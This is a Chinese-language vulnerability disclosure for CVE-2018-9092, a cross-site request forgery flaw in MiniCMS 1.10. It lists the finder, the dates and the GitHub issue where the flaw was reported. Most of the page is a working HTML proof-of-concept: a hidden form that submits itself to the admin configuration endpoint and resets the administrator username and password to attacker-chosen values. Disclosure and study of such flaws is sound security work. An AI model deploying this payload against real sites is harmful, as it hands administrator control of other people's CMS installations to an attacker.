### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|MiniCMS 1.10存在CSRF漏洞可增加管理员账户|2018-03-30|zixian（me@zixian.org、zixian@5ecurity.cn）|[https://github.com/bg5sbk/MiniCMS](https://github.com/bg5sbk/MiniCMS) | [https://github.com/bg5sbk/MiniCMS](https://github.com/bg5sbk/MiniCMS) |1.10| [CVE-2018-9092](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9092)|  

#### 漏洞概述  

> MiniCMS 1.10存在CSRF漏洞，当管理员登陆后访问下面CSRF测试页面可增加管理员账户。MiniCMS是一个在github上开源的CMS系统，漏洞发现者已经将漏洞信息通过[issues](https://github.com/bg5sbk/MiniCMS/issues/14)告知作者。  

### POC实现代码如下：  

> CSRF测试页面代码如下：
``` html
<html>
 <head><meta http-equiv="Content-Type" content="text/html; charset=GB2312">
 <title>test</title>
 <body>
 <form action="http://127.0.0.1/minicms/mc-admin/conf.php" method="post">
 <input type="hidden" name="site_name" value="hack123" />  
 <input type="hidden" name="site_desc" value="hacktest" />  
 <input type="hidden" name="site_link" value="http://127.0.0.1/minicms" />  
 <input type="hidden" name="user_nick" value="hack" />  
 <input type="hidden" name="user_name" value="admin" />  
 <input type="hidden" name="user_pass" value="hackpass" />  
 <input type="hidden" name="comment_code" value="" />  
 <input type="hidden" name="save" value=" " /> 
 </form>
 <script>
  document.forms[0].submit();
 </script>
 </body>
 </head>
 </html>
 ```